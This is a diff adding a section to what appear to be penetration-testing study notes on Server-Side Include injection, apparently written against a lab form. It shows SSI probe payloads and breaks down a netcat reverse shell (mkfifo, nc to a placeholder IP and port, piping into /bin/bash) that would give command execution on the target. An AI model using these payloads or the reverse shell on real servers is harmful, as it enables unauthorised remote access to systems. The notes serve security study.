@@ -573,3 +573,34 @@ vulnerabilities can be blind as well
 
 successful SSI injection can lead to extracting sensitive info from local files or executing commands on the target server 
 
+## SSI Injection Exploitation Example 
+
+our target is a basic form submission:
+
+![](Images/Pasted%20image%2020240213115037.png)
+
+lets try some of the payloads we know: 
+
+```html
+<!--#echo var="DATE_LOCAL" -->
+<!--#printenv -->
+```
+
+![](Images/Pasted%20image%2020240213115230.png)
+
+![](Images/Pasted%20image%2020240213115259.png)
+
+now that we have confirmed that the site is vulnerable to SSI injections we can try some other payloads to see if we can get full command injection 
+
+remember that we can use reverse shells like: 
+
+![](Images/Pasted%20image%2020240213115907.png)
+
+the above will work even against OpenBSD-netcat that doesn't include the execute functionality by default   
+
+the shell uses: 
+- `mkfifo /tmp/foo` - create a FIFO special file in `/tmp/foo`
+- `nc <IP> <PORT> 0</tmp/foo` - connect the pentest machine and redirect the standard input descriptor 
+- `| bin/bash 1>/tmp/foo` - execute `/bin/bash` redirecting the standard output descriptor to `/tmp/foo` 
+- `rm /tmp/foo` - cleanup the FIFO file 
+
